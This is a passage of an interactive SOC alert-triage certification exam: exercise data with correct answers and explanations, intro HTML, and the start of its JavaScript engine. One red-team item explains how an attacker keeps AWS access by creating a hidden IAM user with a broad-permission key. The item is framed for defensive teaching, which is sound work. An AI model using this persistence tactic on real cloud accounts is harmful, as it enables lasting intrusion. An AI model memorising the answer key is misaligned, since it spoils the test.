"High 2", "Grants remote access to 1,800 users", "Failed logon spray from 300 addresses"], ["LAP-2211 marketing laptop", "Medium 3", "User rights only, no server trust", "Loader macro dropped from a mail attachment"]]}, "prompt": "Rank the five alerts from the widest blast radius to the narrowest.", "items": ["DC-01, Kerberoasting service tickets for 12 accounts", "BKP-SRV-01, new administrator account created from a laptop", "VPN-GW-01, failed logon spray from 300 addresses", "WEB-05, uploaded web shell file in the images folder", "LAP-2211, loader macro dropped from a mail attachment"], "explain": "Blast radius is what the attacker can reach from the point of the alert, and the CMDB tells you that in numbers. A domain controller authenticates 4,200 accounts and 310 servers, so a valid Kerberos ticket there is the widest reach on the list. The backup server comes next even though the alert looks small. It holds the restore copies for 210 servers, so if the attacker owns it there is no clean way back. That is a wider business effect than the VPN gateway. The VPN gateway is third because it can let the attacker in, but a spray of failed logons has not produced an account yet. The web shell on the internet-facing server is fourth. It is a real compromise, but the trust in the CMDB stops at one database host, so the reach is narrower. The laptop is last because the user has no server rights, and a mail attachment that was stopped by the loader rule has not spread anywhere. The trap is ranking by alert severity: the web shell and the laptop often look more alarming than an unfinished spray.", "tip": "Rank by reach and impact, not by the name of the alert. The CMDB trust column is your evidence, and you write the rule down so the order can be challenged.", "hint": "Count the systems each asset can reach, then break the tie with criticality. A failed spray has not succeeded yet."}, {"id": "HARD-11", "type": "mcq", "theme": "Attack Patterns & Threat Types", "concepts": ["DLP alert data", "data exfiltration", "false positive suppression and allowlisting"], "title": "The 1.8 GB personal cloud upload", "brief": "Ticket #SOC-20488 · DLP and proxy sources · merger project · 09:55", "scenario": "<p>DLP reports that an employee uploaded 1.8 GB to a personal cloud drive between 09:12 and 11:03. The user works on the merger project and has accepted a job at another company, which HR told you in confidence. The destination is not on the approved SaaS list, and the files came from the merger work area. Legal has opened a hold on the case. The line manager is asking for a quick answer because the project is behind schedule.</p>", "prompt": "What is the correct first action?", "options": ["Ask the user to explain the upload in a short meeting, and write the answer into the ticket as the final verdict.", "Treat it as a possible insider case: preserve the upload records and cloud access logs, then involve legal before speaking to the user.", "Block the personal cloud domain at the proxy and close the alert, because the destination is not approved for company data.", "Close the alert as sanctioned project traffic, since the user needs the merger files and the project is already late."], "correct": [1], "explain": "Three facts decide this case. The destination is not approved. The volume and the timing do not match the user's normal pattern. And the user has one foot out of the company while working on merger data. That combination points to a possible exfiltration case. The first action is to protect the proof - the upload records and the cloud access logs. Then bring in legal, who already hold the case. Blocking the domain is a strong reflex, but it changes the environment before the data is preserved. It also warns the user, which is exactly what an insider case cannot afford. Closing the alert as sanctioned traffic ignores the approved-destination list: the user approved nothing, and a manager's urgency is not an authorisation. Speaking to the user turns an investigation into a conversation. People who are about to leave may delete data or change their story. The interview is a legal decision, not an analyst reflex. Allowlisting personal cloud storage is the final trap: it removes the alert permanently for everybody, not just for this user.", "tip": "In an insider case, preserve and involve legal before you act or speak. A quiet hold protects the case; a visible block protects nothing.", "hint": "Ask which action can still be undone tomorrow morning, and which one changes the evidence or warns the person involved."}, {"id": "HARD-12", "type": "dual", "theme": "Telemetry & Alert Sources", "concepts": ["cloud detection services", "MITRE ATT&CK mapping"], "title": "One cloud case, seen from both sides", "brief": "GuardDuty finding GD-2025-8812 · no endpoint agent on the instance · 02:40", "scenario": "<p>The cloud detection service raised a finding on the account <code>analytics-prod</code>: an instance role was used from the region <code>ap-southeast-2</code>, where this company runs nothing. The instances have <b>no endpoint agent installed</b>. CloudTrail shows an access key that was created eleven minutes before the finding, from the same unusual region. VPC flow logs show outbound traffic to an address with an unrecognised reputation. The identity team says the access key is not in the password vault.</p>", "caseText": "Cloud case GD-2025-8812, account analytics-prod, region ap-southeast-2.\nAn instance role was used from a region where the company runs no workloads.\nCloudTrail: an access key was created eleven minutes before the finding.\nVPC flow logs: outbound traffic to an address with an unrecognised reputation.\nNo endpoint agent is installed, so memory and process data are not available.", "prompt": "Answer both parts of the case. Each part has its own correct answer.", "parts": [{"role": "Blue team - what do you pull first, and how does the signal map to ATT&CK?", "prompt": "Which investigation step is correct for this case?", "options": ["Collect the CloudTrail management events for the role and the new key, then map the call pattern to ATT&CK.", "Isolate the instance through the console, then ask the cloud team to install an agent for the next case.", "Export the flow logs, and block the destination address before any other data is collected at all.", "Restart the instance to clear the current session, then review the IAM role trust policy afterwards."], "answer": 0, "explain": "Without an endpoint agent there is no memory and no process data. So the strongest evidence is the control plane: CloudTrail records <b>who called which API, from where and with which key</b>. The new access key, the unusual region and the API pattern are the facts that identify the technique. That is <b>T1078 Valid Accounts</b> with <b>T1098 Account Manipulation</b> when keys or trust are changed. Isolating the instance is a reasonable later step but it does not tell you what the attacker did, and the missing agent cannot be fixed retroactively. Exporting flow logs is useful, but the flow log only shows that traffic happened. Blocking the address early can also push the attacker to a different channel, before you know what the key can do. A restart closes the door on the evidence without removing the access key that caused the finding."}, {"role": "Red team - the alert fired. How do you keep access to the account?", "prompt": "Which move gives lasting access that survives the incident response?", "options": ["Run reconnaissance with the existing instance role only, and read as much data as the permissions allow.", "Escalate the current session to full administrator by attaching an inline policy to the instance role itself.", "Create a new IAM user with its own access key and attach a broad permission policy, hidden among the other users.", "Modify the instance role trust policy so the same role can be assumed from other accounts you control."], "answer": 2, "explain": "The question is about access that <b>survives</b> the response. A new IAM user with its own long-lived access key is a separate identity. Rotating the instance role, restarting the instance or rebuilding it changes nothing for the attacker. Editing the trust policy of the instance role is a strong near-miss, and it is the second best answer. The role is the object the responders are already looking at, so the change is likely to be found and reverted. Reading data with the existing role adds no persistence at all - when the key is revoked, the access is gone. Attaching a broad inline policy gives power, not persistence, and it writes straight into the same role record the investigation is reading. The blue lesson is simple: enumerate identities and keys, do not only repair the object named in the alert."}], "explain": "The blue part and the red part teach the same sentence. In a cloud case without an endpoint agent, the control plane is your endpoint: CloudTrail, IAM and the flow logs. In red terms, the attacker who only uses the alerted role loses everything when that role is cleaned. So the durable move is a second identity with its own key. That is why the response must list every new user, key and trust change in the account. The leftover unknown detail also matters: an account was created eleven minutes before the alert. That detail belongs in a hunting handoff, not in the closed part of the ticket.", "tip": "In cloud triage, read identity and API records before network records, and check for a second identity before you declare containment.", "hint": "Ask yourself what exists after the alerted object is repaired. If the answer is nothing, the attacker has not been removed."}, {"id": "HARD-13", "type": "mcq", "theme": "Telemetry & Alert Sources", "concepts": ["log source health and pipeline latency", "log parsing and normalization", "SOC metrics MTTD, MTTA, MTTR and false positive rate"], "title": "The alert that arrived three hours late", "brief": "Post-incident review PIR-2025-31 · perimeter brute force · 15:00", "scenario": "<p>In the post-incident review, the team finds that the detection rule for the perimeter brute force was correct and was never changed. The alert still reached the queue three hours after the first failed logon. Management wants the rule improved, and the detection engineer has already drafted two new rules. The pipeline numbers are in the review pack.</p><p>Pipeline health for the incident window, from the review pack:</p><ul><li><b>Perimeter firewall source:</b> event time 02:14, ingestion time 05:11, collector queue depth 214,000 events, timestamp field mapped to the collector arrival time.</li><li><b>Windows endpoint source:</b> event time 02:14, ingestion time 02:14, queue depth 120 events, timestamp field mapped to the event time.</li><li><b>Linux server source:</b> event time 02:14, ingestion time 02:15, queue depth 40 events.</li><li><b>Identity and VPN source:</b> event time 02:14, ingestion time 02:14, queue depth 12 events.</li><li><b>Rule last changed:</b> 14 months ago. <b>Alerts from the other three sources that night:</b> six, all acknowledged within four minutes.</li></ul>", "prompt": "Which action fixes the real cause of the delay?", "options": ["Accept the pipeline delay, because the rule did eventually detect the attack and the queue closed the ticket.", "Check the health and the latency of that source and its parser, before the detection rule is touched at all.", "Shorten the correlation window of the rule so the alert is produced after fewer matching events.", "Lower the alert threshold so the rule fires earlier, and accept more false positives from that same source."], "correct": [1], "explain": "The rule was correct and unchanged, so the delay cannot come from the rule logic. The pipeline numbers show that only the perimeter source is late. The firewall log line carries an event time three hours before the ingestion time. The collector queue holds about 214,000 events. When a source arrives late, the rule can only evaluate those events when they finally land. So the alert is late by exactly that amount. It also arrives with a stale timestamp, which distorts the detection metric. The fix is to repair the health of that source and its parser. That covers the queue backlog, the collection method and the timestamp field. The other sources are normal. Shortening the correlation window makes the rule faster only if the events are present, so it changes nothing here and it risks alerting on incomplete windows. Lowering the threshold adds false positives to a queue without removing one second of latency. Accepting the delay is the most costly option, because it hides a broken control. The same delay would also hide an attack that never produces an alert at all. The metric lesson is to read the timestamp difference, not only the alert time.", "tip": "When detection is late, compare event time with ingestion time per source. A late source or a broken parser looks exactly like a slow rule.", "hint": "One source in the review pack has a gap of hours between the event time and the ingestion time. The others are measured in seconds."}];
var INTRO_HTML = "\n<div class=\"card\">\n  <div class=\"eyebrow\">Standalone certification exam · scenario-based · one keyword, four severity levels</div>\n  <h1 class=\"kw\" style=\"margin:.3rem 0 .2rem\">Alert Triage</h1>\n  <p class=\"sub\" style=\"font-size:1rem;color:var(--txt)\">Challenging level. The alerts are fragments of one intrusion, the evidence disagrees with itself, and the obvious answer is sometimes the wrong one.</p>\n  <div class=\"tiles\">\n    <div class=\"tile\"><div class=\"k\">Severity of this file</div><div class=\"v\"><span class=\"sev hard\">HARD</span></div></div>\n    <div class=\"tile\"><div class=\"k\">Passing score</div><div class=\"v\">80% of answered exercises</div></div>\n    <div class=\"tile\"><div class=\"k\">Time limit</div><div class=\"v\">52 minutes, pausable</div></div>\n    <div class=\"tile\"><div class=\"k\">Workload</div><div class=\"v\">13 exercises · 130 points</div></div>\n  </div>\n</div>\n\n\n<div class=\"card\">\n  <h2>Alert triage under real pressure</h2>\n  <p class=\"sub\">Your keyword, explained in plain words, with the part that makes it hard.</p>\n  <p><b>Alert triage</b> is the decision point of the security operation. Every alert is a question:\n  <b>what happened, on which asset, how far has it gone, and what should we do in the next ten minutes?</b>\n  At this level the alerts are not single events. They are fragments of an intrusion, and the fragments\n  disagree with each other.</p>\n  <p>Imagine a normal Wednesday. Your queue shows a script that starts from a spreadsheet macro, a scheduled\n  job that talks to cloud storage every ten minutes, a server that runs a shell as the web service account, and\n  a backup that copies eight gigabytes at night. Two of these are business as usual. Two are the middle of an\n  attack. Your job is to tell them apart <b>and</b> to preserve the evidence while doing it.</p>\n\n  <h3>What makes it hard</h3>\n  <ul class=\"tight\">\n    <li><b>Conflicting signals.</b> A tool that is allowed can look exactly like a tool that is abused\n    (this is what “living off the land” means). The answer is usually in the parent process, the account, the\n    time and the surrounding events - not in the alert title.</li>\n    <li><b>The obvious answer is often wrong.</b> Isolating the first machine you see may destroy the memory\n    that proves what happened, or may tip off the attacker while two other hosts are still compromised.</li>\n    <li><b>Blast radius.</b> You must estimate how far the attacker can reach from the first foothold:\n    which credentials were used, which shares were mounted, which systems trust each other.</li>\n    <li><b>Evidence order.</b> Some evidence disappears in seconds (memory, network connections, running\n    processes) and some survives on disk. The order of volatility decides what you capture first.</li>\n    <li><b>Chain of custody.</b> If the case may end in court or in a disciplinary process, every transfer of\n    evidence needs a record: who, when, what, and a hash to prove nothing changed.</li>\n    <li><b>Automation and its limits.</b> A SOAR playbook can enrich and isolate in seconds, but it can also\n    isolate the wrong host at the wrong time. You must know what the playbook does before you press it.</li>\n    <li><b>Telemetry health.</b> When a detection fails, the cause is sometimes the parser or a log source that\n    stopped sending, not the rule.</li>\n  </ul>\n\n  <h3>Where this work happens</h3>\n  <ul class=\"tight\">\n    <li><b>SOC level 2 and level 3:</b> deep analysis, containment decisions, coordination with IR.</li>\n    <li><b>Incident response:</b> runs the case from containment to recovery and writes the timeline.</li>\n    <li><b>Threat hunting:</b> receives the unexplained leftovers and looks for the missing evidence.</li>\n    <li><b>Detection engineering:</b> turns every miss into a rule and every noisy rule into a tuned one.</li>\n    <li><b>Cloud and platform engineering:</b> implements the blocks, the isolation and the rebuilds.</li>\n    <li><b>Legal, HR and management:</b> step in as soon as the case may involve people, contracts or regulators.</li>\n  </ul>\n\n  <p class=\"muted\">In one sentence: hard triage is the discipline of deciding with incomplete, contradictory\n  evidence - and of protecting both the business and the proof.</p>\n</div>\n\n\n<div class=\"card\">\n  <h2>How this certification exam runs</h2>\n  <p class=\"sub\">The rules, the timer, the skip system and the exercise types. Read this once, then start whenever you are ready.</p>\n  <div class=\"grid2\">\n    <div class=\"box\">\n      <h4>Scoring</h4>\n      <ul class=\"tight\">\n        <li>Every exercise is worth <b>10 points</b>.</li>\n        <li>A correct answer gives <b>10 points</b>. A wrong answer gives <b>0 points</b>.</li>\n        <li>A hint costs <b>10% of that exercise</b> (1 point). A hint gives a nudge, never the answer.</li>\n        <li>In a <b>terminal exercise</b>, every wrong command also costs 1 point (10%), exactly like a hint.\n        You can always finish the exercise and keep the remaining points.</li>\n        <li>In a <b>branching exercise</b> or an <b>alert queue</b>, every decision or queue row must be right\n        for the exercise to score.</li>\n        <li>The percentage is computed <b>only over the exercises you actually answered</b>.</li>\n        <li>Passing score: <b>80%</b>. Below that, you retake the exam.</li>\n      </ul>\n    </div>\n    <div class=\"box\">\n      <h4>Timer and breaks</h4>\n      <ul class=\"tight\">\n        <li>Total time for this file: <b>52 minutes</b>.</li>\n        <li>The countdown is always visible at the top of the screen.</li>\n        <li>Use <b>Pause</b> (or press <code>Esc</code>) when you take a break. While paused, the exercises are\n        hidden and blurred and the timer is stopped, so you cannot read the questions during the break.</li>\n        <li>When the time reaches zero, the exam is submitted automatically. Exercises left unanswered are excluded\n        from the score.</li>\n      </ul>\n    </div>\n    <div class=\"box\">\n      <h4>Skip and review</h4>\n      <ul class=\"tight\">\n        <li><b>Every exercise has a Skip button.</b> Skipping is free, and it never shows the answer.</li>\n        <li>A skipped exercise goes to the <b>Skipped pool</b> (Exercise map, amber squares).</li>\n        <li>Before the exam can finish, you get a <b>“Review skipped exercises”</b> screen that lists every\n        skipped exercise and lets you go back to it.</li>\n        <li>You may return to skipped exercises as many times as you want, until the timer ends or you submit.</li>\n        <li>If you submit while an exercise is still unanswered, it is <b>excluded from the score</b>: not correct,\n        not wrong, and its points are not added to the total possible points.</li>\n      </ul>\n    </div>\n    <div class=\"box\">\n      <h4>Exercise types in this file</h4>\n      <ul class=\"tight small\"><li>Alert queue simulation - choose the right action for every alert</li><li>Branching decision scenario - each choice unlocks the next step</li><li>Drag each card into the correct box</li><li>Drag the alerts to rank them by priority</li><li>Dual perspective - the same case from the blue team and the red team</li><li>Fill in the blanks of a real document from a shuffled word bank</li><li>Interactive terminal where you type the real command</li><li>Log, table, e-mail or document analysis with a filter box</li><li>Match each item to the right answer</li><li>Multi-select question - several correct answers</li><li>Single-choice question on a realistic artefact</li></ul>\n      <p class=\"muted small\">Some exercises ask you to drag cards (mouse) - on a tablet you can also\n      tap a card and then tap the target box. Answers are shuffled at every attempt, and the whole exercise\n      order is shuffled again when you retake the exam.</p>\n    </div>\n    <div class=\"box\">\n      <h4>Words you will see (plain meanings)</h4>\n      <ul class=\"tight small\">\n        <li><b>alert</b> - a message from a security tool that something needs a human look.</li>\n        <li><b>triage</b> - sorting alerts: is it real, how bad, who acts and how fast.</li>\n        <li><b>SIEM</b> - the platform that collects logs and runs detection rules. <b>EDR</b> - the agent that\n        watches one endpoint and shows its processes and connections.</li>\n        <li><b>true positive / false positive / benign true positive</b> - a real problem / noise / real but allowed.</li>\n        <li><b>IOC</b> - indicator of compromise: a file hash, domain or address linked to an attack.\n        <b>TTP</b> - the way an attacker works.</li>\n        <li><b>enrichment</b> - adding context to an alert (who owns the host, is the file known bad).</li>\n        <li><b>escalation</b> - passing the case to a higher level with the facts it needs.</li>\n        <li><b>containment</b> - stopping the spread: isolate a host, disable an account, block a domain.</li>\n        <li><b>blast radius</b> - how far the attacker can reach from the first foothold.</li>\n        <li><b>SLA / OLA</b> - the promised response times, to the business and between internal teams.</li>\n        <li><b>MTTD / MTTA / MTTR</b> - mean time to detect / to acknowledge / to resolve.</li>\n        <li><b>SOAR</b> - software that runs the repetitive triage steps automatically.\n        <b>DLP</b> - a tool that watches for data leaving the company.</li>\n        <li><b>ATT&CK</b> - MITRE's public list of attacker tactics and techniques.\n        <b>kill chain</b> - the stages of an intrusion, from recon to exfiltration.</li>\n        <li><b>chain of custody</b> - the record of who handled evidence, when and why.</li>\n        <li><b>PIR</b> - post-incident review: the meeting that turns a case into improvements.</li>\n      </ul>\n    </div>\n    <div class=\"box\" style=\"border-color:#31527a\">\n      <h4>What the severity level means here</h4>\n      <p class=\"muted small\" style=\"margin-bottom:.4rem\">\n        <span class=\"sev hard\">HARD</span>\n      </p>\n      <p class=\"muted small\">HARD - Challenging. Every exercise hides at least one near-miss answer that is a true statement used in the wrong place. You must read the artefact line by line, apply the rule to the evidence in front of you, and accept that the fast reflex reaction is often the damaging one. Memorised definitions will not carry you through this file.</p>\n    </div>\n  </div>\n  <div class=\"qactions\">\n    <button class=\"btn primary lg\" onclick=\"startExam()\">Start the exam ▸</button>\n  </div>\n</div>\n\n<div class=\"box\"><h4>What this file tests - the keyword concept map</h4><p class=\"muted small\">The complete concept map of the keyword <b>Alert Triage</b>, grouped by theme. Every concept in this map is exercised in at least one of the four severity files of this exam set, so that no single file carries everything alone.</p><div class=\"legendline\"><span class=\"dot\"></span> Themes marked with the blue bar are covered by this exam file; the grey themes belong to the other severity levels.</div><div class=\"themes\"><div class=\"theme\"><h4>Triage Core & Workflow</h4><div class=\"tags\"><span class=\"tag\">alert queue and worklist</span><span class=\"tag\">SLA and OLA response targets</span><span class=\"tag\">true positive vs false positive vs benign true positive</span><span class=\"tag\">alert fatigue</span><span class=\"tag\">deduplication and alert correlation</span><span class=\"tag\">triage playbook / SOP / runbook</span><span class=\"tag\">shift handover and ticket notes</span><span class=\"tag\">severity levels SEV1-SEV4 and priority vs severity</span><span class=\"tag\">alert validation before escalation</span></div></div><div class=\"theme used\"><h4><span class=\"dot\"></span>Telemetry & Alert Sources</h4><div class=\"tags\"><span class=\"tag\">SIEM platform (Splunk, Elastic, Sentinel)</span><span class=\"tag\">EDR and XDR endpoint telemetry</span><span class=\"tag\">IDS and IPS alerts</span><span class=\"tag\">firewall, proxy and DNS logs</span><span class=\"tag\">cloud detection services</span><span class=\"tag\">identity and authentication logs</span><span class=\"tag\">email gateway and phishing reports</span><span class=\"tag\">DLP alert data</span><span class=\"tag\">honeypot and deception alerts</span><span class=\"tag\">log parsing and normalization</span><span class=\"tag\">log source health and pipeline latency</span></div></div><div class=\"theme used\"><h4><span class=\"dot\"></span>Detection, Enrichment & Threat Context</h4><div class=\"tags\"><span class=\"tag\">IOC enrichment and reputation lookups</span><span class=\"tag\">sandbox detonation</span><span class=\"tag\">MITRE ATT&CK mapping</span><span class=\"tag\">cyber kill chain stages</span><span class=\"tag\">detection rule logic and tuning</span><span class=\"tag\">threat intel platform, MISP, STIX/TAXII</span><span class=\"tag\">vulnerability context (CVE, CVSS, exploitability)</span><span class=\"tag\">defanging IOCs and safe handling</span><span class=\"tag\">false positive suppression and allowlisting</span></div></div><div class=\"theme used\"><h4><span class=\"dot\"></span>Prioritization, Risk & Metrics</h4><div class=\"tags\"><span class=\"tag\">asset criticality and CMDB context</span><span class=\"tag\">risk scoring and prioritization models</span><span class=\"tag\">blast radius and lateral movement assessment</span><span class=\"tag\">SOC metrics MTTD, MTTA, MTTR and false positive rate</span><span class=\"tag\">order of volatility for evidence</span></div></div><div class=\"theme used\"><h4><span class=\"dot\"></span>Response & Containment</h4><div class=\"tags\"><span class=\"tag\">escalation matrix and on-call rota</span><span class=\"tag\">host isolation and containment</span><span class=\"tag\">containment authority and approval</span><span class=\"tag\">blocking at firewall, proxy and DNS sinkhole</span><span class=\"tag\">email quarantine and purge</span><span class=\"tag\">credential reset, session and token revocation</span><span class=\"tag\">evidence preservation and integrity</span><span class=\"tag\">chain of custody</span><span class=\"tag\">SOAR playbooks and automation</span></div></div><div class=\"theme\"><h4>Case Management & Handoff</h4><div class=\"tags\"><span class=\"tag\">ticketing and case management (ServiceNow, Jira, TheHive)</span><span class=\"tag\">handoff to threat hunting</span><span class=\"tag\">stakeholder communication and war room</span></div></div><div class=\"theme used\"><h4><span class=\"dot\"></span>Attack Patterns & Threat Types</h4><div class=\"tags\"><span class=\"tag\">phishing and BEC alerts</span><span class=\"tag\">ransomware alerts</span><span class=\"tag\">brute force and credential stuffing</span><span class=\"tag\">C2 beaconing</span><span class=\"tag\">data exfiltration</span><span class=\"tag\">LOLBins and living off the land</span><span class=\"tag\">insider threat</span><span class=\"tag\">web shell and server compromise</span><span class=\"tag\">privilege escalation</span><span class=\"tag\">port scanning and reconnaissance</span><span class=\"tag\">account takeover and impossible travel</span><span class=\"tag\">supply chain and third-party compromise</span></div></div><div class=\"theme\"><h4>Governance, Frameworks & Improvement</h4><div class=\"tags\"><span class=\"tag\">NIST SP 800-61 incident handling lifecycle</span><span class=\"tag\">ISO/IEC 27035 incident management</span><span class=\"tag\">breach notification duties (GDPR 72h, NIS2)</span><span class=\"tag\">post-incident review and lessons learned</span><span class=\"tag\">purple team feedback and detection gaps</span></div></div></div></div>\n\n<div class=\"card\">\n  <h2>Before you start</h2>\n  <p class=\"sub\">One professional habit, and what happens after you submit.</p>\n  <div class=\"grid2\">\n    \n<div class=\"box\"><h4>Safety habit - defanged indicators</h4>\n<p class=\"muted small\">All addresses, domains and indicators in this exam are <b>defanged</b> - written in a\nsafe form, for example <code>hxxp://evil[.]example</code> or <code>10[.]0[.]0[.]1</code>. This is a normal\nprofessional habit: it stops a copy-paste from becoming a live link.</p></div>\n\n    <div class=\"box\"><h4>After submitting</h4>\n      <p class=\"muted small\">You get a full report: score, percentage, per-theme result, PASS or FAIL,\n      and an explanation for <b>every</b> exercise - including why the wrong answers are wrong and what to\n      revise. If you fail, a <b>Retake exam</b> button resets everything with new random orders.</p>\n    </div>\n  </div>\n  <div class=\"qactions\">\n    <button class=\"btn primary lg\" onclick=\"startExam()\">Start the exam ▸</button>\n  </div>\n</div>\n";

/* =========================================================================
   Alert Triage - standalone certification exam engine
   Vanilla JS. No libraries. Mouse + touch (click) support.
   Types: mcq, multi, log, order, rank, classify, match, fill, terminal,
          branch, triage (alert queue), dual (blue team / red team).
   ========================================================================= */
var MAXPTS = 10;               /* points per exercise */
var HINTCOST = 1;              /* hint = -10% of the exercise = 1 point */
var S = {pool:[], idx:0, res:{}, hints:{}, skipped:[], time:0, tid:null,
         paused:false, done:false, timeover:false, started:false};

/* ------------------------------- helpers ------------------------------- */
function $(sel, root){ return (root||document).querySelector(sel); }
function $$(sel, root){ return Array.prototype.slice.call((root||document).querySelectorAll(sel)); }
function shuffle(a){
  a = a.slice();
  for(var i=a.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var t=a[i]; a[i]=a[j]; a[j]=t; }
  return a;
}
function esc(s){
  return String(s).replace(/[&<>"]/g, function(c){
    return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[c];
  });
}
function fmt(sec){
  sec = Math.max(0, sec|0);
  var m = Math.floor(sec/60), s = sec%60;
  return (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
}
function flash(msg){
  var f = $('#flashBox');
  if(!f){ return; }
  f.textContent = msg;
  f.style.display='block';
  setTimeout(function(){ f.style.display='none'; }, 4000);
}
function scrollTop(){ try{ window.scrollTo({top:0, behavior:'smooth'}); }catch(e){ window.scrollTo(0,0); } }

/* --------------------------- exercise preparation ---------------------- */
function prepare(ex){
  var x = JSON.parse(JSON.stringify(ex));
  x._hint = 0;
  x._opts = null; x._display = null; x._items = null; x._bank = null; x._pool = null;
  if(x.type==='mcq' || x.type==='multi' || x.type==='log'){
    x._opts = shuffle(x.options.map(function(t,i){ return {t:t, ok:x.correct.indexOf(i)>=0}; }));
  }
  if(x.type==='classify'){
    x._items = shuffle(x.items.map(function(it){ return {text:it.text, bucket:it.bucket}; }));
  }
  if(x.type==='match'){
    var rights = x.pairs.map(function(p){ return p.right; }).filter(function(v,i,a){ return a.indexOf(v) === i; });
    x._pool = shuffle(rights);
  }
  if(x.type==='fill'){
    x._bank = shuffle(x.bank.slice());
  }
  if(x.type==='order' || x.type==='rank'){
    x._display = shuffle(x.items.slice());
  }
  if(x.type==='branch'){
    x._node = 0; x._firstTry = true; x._wrongPicks = 0;
    /* shuffle the options of every decision node so the correct choice is never in a fixed position */
    x.nodes = x.nodes.map(function(n){
      var nn = JSON.parse(JSON.stringify(n));
      nn.options = shuffle(nn.options);
      return nn;
    });
  }
  if(x.type==='terminal'){
    x._step = 0;
    x._wrong = 0;
    x._log = ['<div class="to">'+esc(x.console || 'soc-console 4.2 - analyst workstation')+' - session started</div>',
              '<div class="to">Type the command for the requested step, then press Enter.</div>'];
  }
  if(x.type==='triage'){
    /* shuffle the actions of every queue row so the correct action is never in a fixed slot */
    x._q = x.alerts.map(function(a){
      return {id:a.id, sev:a.sev, src:a.src, title:a.title, detail:a.detail, outcome:a.outcome,
              actions:shuffle(a.actions.map(function(t,i){ return {t:t, ok:i===a.answer}; }))};
    });
  }
  if(x.type==='dual'){
    x._parts = x.parts.map(function(p){
      return {role:p.role, prompt:p.prompt, explain:p.explain,
              options:shuffle(p.options.map(function(t,i){ return {t:t, ok:i===p.answer}; }))};
    });
  }
  return x;
}

/* --------------------------------- timer ------------------------------- */
function startExam(){
  S.pool   = shuffle(EXERCISES.slice()).map(prepare);
  S.idx    = 0;
  S.res    = {};
  S.hints  = {};
  S.skipped= [];
  S.done   = false;
  S.reported = false;   /* score bridge: one report per attempt */
  S.paused = false;
  S.timeover = false;
  S.started = true;
  S.time   = EXAM.minutes*60;
  document.body.classList.remove('paused');
  var ov = $('#pauseOv'); if(ov){ ov.style.display='none'; }
  if(S.tid){ clearInterval(S.tid); }
  S.tid = setInterval(tick, 1000);
  renderExam();
}
function tick(){
  if(S.paused || S.done){ return; }
  S.time--;
  if(S.time <= 0){ S.time = 0; updateHUD(); timeUp(); return; }
  updateHUD();
}
function timeUp(){
  S.timeover = true;
  S.done = true;
  if(S.tid){ clearInterval(S.tid); S.tid = null; }
  document.body.classList.remove('paused');
  var ov = $('#pauseOv'); if(ov){ ov.style.display='none'; }
  showResults();
}
function togglePause(){
  if(S.done || !S.started){ return; }
  S.paused = !S.paused;
  document.body.classList.toggle('paused', S.paused);
  var ov = $('#pauseOv');
  if(!ov){ ov = document.createElement('div'); ov.id='pauseOv'; ov.className='pauseov'; document.body.appendChild(ov); }
  if(S.paused){
    ov.innerHTML = '<div class="pausepanel"><h2>Timer paused</h2>'+
      '<p class="muted">The exercises are hidden and blurred while the timer is paused, so you cannot read them during the break.</p>'+
      '<p class="muted small">The countdown is stopped.</p>'+
      '<button class="btn primary" onclick="togglePause()">Resume exam</button></div>';
    ov.style.display = 'flex';
  } else {
    ov.style.display = 'none';
  }
  updateHUD();
}

/* ------------------------------ statistics ----------------------------- */
function stats(){
  var answered=0, correct=0, wrong=0, earned=0, possible=0, skippedLeft=0;
  S.pool.forEach(function(x){
    var r = S.res[x.id];
    if(!r || r.status==='skipped'){ skippedLeft++; return; }
    answered++; possible += MAXPTS; earned += r.earned;
    if(r.status==='correct'){ correct++; } else { wrong++; }
  });
  return {answered:answered, correct:correct, wrong:wrong, earned:earned,
          possible:possible, skipped:skippedLeft, total:S.pool.length};
}
function updateHUD(){
  var st = stats();
  var t = $('#hudTime');
  if(t){
    t.textContent = fmt(S.time);
    var pill = t.parentNode;
    pill.className = 'pill timer';
    if(S.time <= 60){ pill.className = 'pill timer low'; }
    else if(S.time <= EXAM.minutes*60*0.25){ pill.className = 'pill timer warn'; }
  }
  var sc = $('#hudScore');
  if(sc){
    var newText = st.earned + ' / ' + st.possible + ' pts';
    if(sc.textContent !== newText){
      sc.textContent = newText;
      var pill = sc.parentNode;
      if(pill && pill.classList){
        pill.classList.remove('bump');
        void pill.offsetWidth;
        pill.classList.add('bump');
      }
    }
  }
  var pct = st.total ? Math.round((st.answered/st.total)*100) : 0;
  var pr = $('#hudProg'); if(pr){ pr.style.width = pct + '%'; }
  var pc = $('#hudPct'); if(pc){ pc.textContent = pct + '% done'; }
  var sk = $('#hudSkip'); if(sk){ sk.textContent = st.skipped + ' skipped'; }
  var pb = $('#pauseBtn'); if(pb){ pb.textContent = S.paused ? '▶ Resume' : '⏸ Pause'; }
}

/* ------------------------------ artifacts ------------------------------ */
function artifactHTML(x){
  var a = x.artifact;
  if(!a){ return ''; }
  var h = '<div class="artifact">';
  h += '<div class="ahead"><span class="aname">'+esc(a.title||'artifact')+'</span>';
  h += '<span class="muted small">'+esc(a.meta||a.kind||'')+'</span></div>';
  if(a.kind==='log'){
    h += '<div class="abody"><input class="logfilter" placeholder="filter lines (like Kibana / Splunk) ..." oninput="filterLog(this)" />';
    h += '<div id="logbox">';
